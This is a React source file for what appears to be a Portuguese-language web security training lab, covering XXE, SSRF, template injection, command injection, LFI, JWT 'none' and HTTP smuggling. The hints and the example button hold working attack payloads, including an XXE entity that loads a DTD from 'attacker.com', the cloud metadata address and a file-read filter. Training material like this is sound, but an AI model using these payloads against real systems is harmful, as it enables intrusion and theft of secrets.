// src/pages/AdvancedLabs.jsx
import { useState, useEffect } from 'react';
import api from '../api/client';
import Toast from '../components/Toast';
import LoadingSpinner from '../components/LoadingSpinner';
import EmptyState from '../components/EmptyState';
import { motion, AnimatePresence } from 'framer-motion';
import { Send, Copy, Check, Filter, Search, Beaker, AlertCircle, Clock, Zap, X } from "lucide-react";

const labs = [
  { id: "xxe", name: "XXE OOB", endpoint: "/api/vulnerabilities/xxe/oob", method: "POST", type: "xml", hint: "Use entidade externa para exfiltrar /etc/passwd", difficulty: "Hard", category: "Injection" },
  { id: "ssrf", name: "SSRF Avançado", endpoint: "/api/vulnerabilities/ssrf/advanced?url=", method: "GET", hint: "Acesse 169.254.169.254/latest/meta-data/", difficulty: "Medium", category: "SSRF" },
  { id: "template", name: "Template Injection", endpoint: "/api/vulnerabilities/template/escape", method: "POST", hint: "${T(java.lang.System).getenv()}", difficulty: "Hard", category: "Injection" },
  { id: "cmd", name: "Command Injection", endpoint: "/api/vulnerabilities/cmd?cmd=", method: "GET", hint: "id; whoami", difficulty: "Medium", category: "Injection" },
  { id: "lfi", name: "LFI", endpoint: "/api/vulnerabilities/lfi?file=", method: "GET", hint: "php://filter/convert.base64-encode/resource=index.php", difficulty: "Easy", category: "File Inclusion" },
  { id: "jwt", name: "JWT None", endpoint: "/api/vulnerabilities/jwt/none", method: "POST", header: true, hint: '{"alg":"none"} no token', difficulty: "Medium", category: "Authentication" },
  { id: "smuggling", name: "HTTP Smuggling", endpoint: "/api/vulnerabilities/smuggle/clte", method: "POST", hint: "Use CL + TE", difficulty: "Hard", category: "HTTP" },
];

function IconSend({ className }) {
  return <Send className={className} />;
}
function IconCopy({ className }) {
  return <Copy className={className} />;
}
function IconCheck({ className }) {
  return <Check className={className} />;
}

export default function AdvancedLabs() {
  const [selected, setSelected] = useState(labs[0]);
  const [input, setInput] = useState('');
  const [response, setResponse] = useState('');
  const [loading, setLoading] = useState(false);
  const [tab, setTab] = useState('request');
  const [toast, setToast] = useState({ show: false, message: '', type: 'success' });
  const [completedLabs, setCompletedLabs] = useState([]);
  const [filter, setFilter] = useState({ category: 'All', difficulty: 'All', search: '' });

  useEffect(() => {
    const fetchCompleted = async () => {
      try {
        const res = await api.get('/api/labs/completed');
        setCompletedLabs(res.data);
      } catch (err) {
        console.error(err);
      }
    };
    fetchCompleted();
  }, []);

  const showToast = (message, type = 'success') => {
    setToast({ show: true, message, type });
    setTimeout(() => setToast({ show: false, message: '', type: 'success' }), 3000);
  };

  const send = async () => {
    setLoading(true);
    setResponse('');
    setTab('response');
    try {
      let res;
      if (selected.header) {
        res = await api.post(selected.endpoint, input, { headers: { Authorization: input } });
      } else if (selected.method === 'GET') {
        res = await api.get(selected.endpoint + encodeURIComponent(input));
      } else {
        const data = selected.type === 'xml' ? input : { payload: input };
        res = await api.post(selected.endpoint, data);
      }

      const pretty = JSON.stringify(res.data, null, 2);
      setResponse(pretty);

      if (res.data.success && !completedLabs.includes(selected.id)) {
        const newCompleted = [...completedLabs, selected.id];
        setCompletedLabs(newCompleted);
        showToast(`Lab "${selected.name}" concluído!`, 'success');
      }
    } catch (err) {
      const msg = err.response?.data || err.message;
      setResponse(`Erro: ${typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg}`);
    } finally {
      setLoading(false);
    }
  };

  const copyResponse = async () => {
    try {
      await navigator.clipboard.writeText(response);
      showToast('Resposta copiada!', 'success');
    } catch {
      showToast('Falha ao copiar', 'danger');
    }
  };

  const resetLab = () => {
    setInput('');
    setResponse('');
    setTab('request');
  };

  const filteredLabs = labs.filter(lab =>
    (filter.category === 'All' || lab.category === filter.category) &&
    (filter.difficulty === 'All' || lab.difficulty === filter.difficulty) &&
    (filter.search === '' || lab.name.toLowerCase().includes(filter.search.toLowerCase()) || lab.hint.toLowerCase().includes(filter.search.toLowerCase()))
  );

  const getDifficultyColor = (d) => ({
    Easy: 'bg-success text-white',
    Medium: 'bg-warning text-dark',
    Hard: 'bg-danger text-white'
  })[d] || 'bg-secondary text-white';

  const placeholder = selected.type === 'xml'
    ? `<?xml version="1.0"?>\n<!DOCTYPE root [ ... ]>\n<root>...\n</root>`
    : selected.header ? 'Bearer SEU_JWT_AQUI' : selected.method === 'GET' ? 'parâmetro' : 'Payload JSON ou texto';

  if (loading && !response) return <LoadingSpinner text="Executando request..." />;

  return (
    <div className="min-vh-100 bg-light">
      <AnimatePresence>
        {toast.show && <Toast message={toast.message} type={toast.type} onClose={() => setToast({ show: false })} />}
      </AnimatePresence>

      <header className="bg-white shadow-sm border-bottom sticky-top">
        <div className="container py-4">
          <div className="d-flex justify-content-between align-items-center">
            <div>
              <h1 className="h4 fw-bold mb-1 d-flex align-items-center gap-2">
                <Beaker size={24} /> Laboratórios Avançados
              </h1>
              <p className="text-muted mb-0">Desafios reais em ambiente controlado</p>
            </div>
            <motion.span
              key={completedLabs.length}
              initial={{ scale: 0.8 }}
              animate={{ scale: 1 }}
              className="badge bg-primary fs-6 rounded-pill"
            >
              {completedLabs.length}/{labs.length} concluídos
            </motion.span>
          </div>
        </div>
      </header>

      <div className="container py-5">
        <div className="row g-4">
          {/* Sidebar */}
          <div className="col-lg-4">
            <motion.div
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              className="card border-0 shadow-sm sticky-top"
              style={{ top: '1rem', borderRadius: '1rem' }}
            >
              <div className="card-header bg-white">
                <div className="d-flex justify-content-between align-items-center mb-3">
                  <strong className="d-flex align-items-center gap-2">
                    <Filter size={18} /> Laboratórios
                  </strong>
                  <small className="text-muted">{filteredLabs.length}</small>
                </div>

                <div className="input-group mb-3">
                  <span className="input-group-text bg-light border-end-0">
                    <Search size={16} />
                  </span>
                  <input
                    type="text"
                    className="form-control border-start-0"
                    placeholder="Buscar lab..."
                    value={filter.search}
                    onChange={e => setFilter({ ...filter, search: e.target.value })}
                  />
                </div>

                <div className="row g-2">
                  <div className="col-12">
                    <select className="form-select form-select-sm" value={filter.category} onChange={e => setFilter({ ...filter, category: e.target.value })}>
                      <option value="All">Todas as categorias</option>
                      {[...new Set(labs.map(l => l.category))].map(c => <option key={c} value={c}>{c}</option>)}
                    </select>
                  </div>
                  <div className="col-12">
                    <select className="form-select form-select-sm" value={filter.difficulty} onChange={e => setFilter({ ...filter, difficulty: e.target.value })}>
                      <option value="All">Todas as dificuldades</option>
                      <option value="Easy">Fácil</option>
                      <option value="Medium">Médio</option>
                      <option value="Hard">Difícil</option>
                    </select>
                  </div>
                </div>
              </div>

              <div className="list-group list-group-flush" style={{ maxHeight: '520px', overflowY: 'auto' }}>
                {filteredLabs.length === 0 ? (
                  <div className="p-4 text-center">
                    <EmptyState title="Nenhum lab encontrado" description="Tente ajustar os filtros" />
                  </div>
                ) : (
                  filteredLabs.map(lab => {
                    const active = selected.id === lab.id;
                    const completed = completedLabs.includes(lab.id);
                    return (
                      <motion.button
                        key={lab.id}
                        whileHover={{ x: 4 }}
                        onClick={() => { setSelected(lab); resetLab(); }}
                        className={`list-group-item list-group-item-action text-start ${active ? 'active' : ''} border-0`}
                        style={{ borderRadius: '0.5rem', margin: '0.25rem' }}
                      >
                        <div className="d-flex justify-content-between align-items-center">
                          <div className="d-flex align-items-center gap-2">
                            {completed && <IconCheck className="text-success" style={{ width: '16px', height: '16px' }} />}
                            <strong>{lab.name}</strong>
                          </div>
                          <small className="text-muted">{lab.method}</small>
                        </div>
                        <div className="d-flex justify-content-between align-items-center mt-1">
                          <small className="text-muted text-truncate me-2">{lab.hint}</small>
                          <span className={`badge rounded-pill ${getDifficultyColor(lab.difficulty)}`}>{lab.difficulty}</span>
                        </div>
                      </motion.button>
                    );
                  })
                )}
              </div>
            </motion.div>
          </div>

          {/* Main */}
          <div className="col-lg-8">
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              className="card border-0 shadow-sm"
              style={{ borderRadius: '1rem' }}
            >
              <div className="card-header bg-white d-flex justify-content-between align-items-start flex-wrap gap-2">
                <div>
                  <h5 className="mb-1 d-flex align-items-center gap-2">
                    <Zap size={20} /> {selected.name}
                  </h5>
                  <p className="text-muted small mb-2">{selected.hint}</p>
                  <div className="d-flex flex-wrap gap-2">
                    <span className="badge bg-secondary small">Endpoint: <code className="ms-1">{selected.endpoint}</code></span>
                    <span className={`badge ${getDifficultyColor(selected.difficulty)} small`}>{selected.difficulty}</span>
                    {selected.header && <span className="badge bg-warning text-dark small">Header</span>}
                  </div>
                </div>
                <div className="d-flex gap-2">
                  <button onClick={resetLab} className="btn btn-outline-secondary btn-sm">Limpar</button>
                  <button onClick={send} disabled={loading} className="btn btn-primary btn-sm d-flex align-items-center gap-1">
                    <IconSend style={{ width: '16px', height: '16px' }} />
                    {loading ? 'Enviando...' : selected.method}
                  </button>
                </div>
              </div>

              <div className="card-body">
                <ul className="nav nav-tabs mb-3">
                  <li className="nav-item">
                    <button className={`nav-link ${tab === 'request' ? 'active' : ''}`} onClick={() => setTab('request')}>Request</button>
                  </li>
                  <li className="nav-item">
                    <button className={`nav-link ${tab === 'response' ? 'active' : ''}`} onClick={() => setTab('response')}>Response</button>
                  </li>
                </ul>

                {tab === 'request' ? (
                  <div>
                    <label className="form-label small fw-semibold">Entrada</label>
                    <textarea
                      className="form-control font-monospace"
                      rows="10"
                      value={input}
                      onChange={e => setInput(e.target.value)}
                      placeholder={placeholder}
                      style={{ resize: 'none' }}
                    />
                    <div className="d-flex justify-content-between mt-3">
                      <button onClick={send} disabled={loading} className="btn btn-primary d-flex align-items-center gap-1">
                        <IconSend style={{ width: '16px', height: '16px' }} />
                        Enviar
                      </button>
                      <button
                        onClick={() => setInput(selected.type === 'xml' ? `<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">\n  %remote;\n]>\n<root>&send;</root>` : 'Bearer ')}
                        className="btn btn-outline-secondary btn-sm"
                      >
                        Exemplo
                      </button>
                    </div>
                  </div>
                ) : (
                  <div>
                    <div className="d-flex justify-content-between align-items-center mb-2">
                      <h6 className="mb-0">Resposta</h6>
                      <div>
                        <button onClick={copyResponse} className="btn btn-outline-secondary btn-sm d-flex align-items-center gap-1">
                          <IconCopy style={{ width: '16px', height: '16px' }} />
                          Copiar
                        </button>
                        <button onClick={() => setResponse('')} className="btn btn-outline-danger btn-sm ms-1">Limpar</button>
                      </div>
                    </div>
                    <div className="bg-light border rounded p-3" style={{ maxHeight: '400px', overflow: 'auto' }}>
                      {response ? (
                        <pre className="mb-0 small text-wrap font-monospace">{response}</pre>
                      ) : (
                        <p className="text-center text-muted py-5 mb-0">Envie um request para ver a resposta.</p>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
}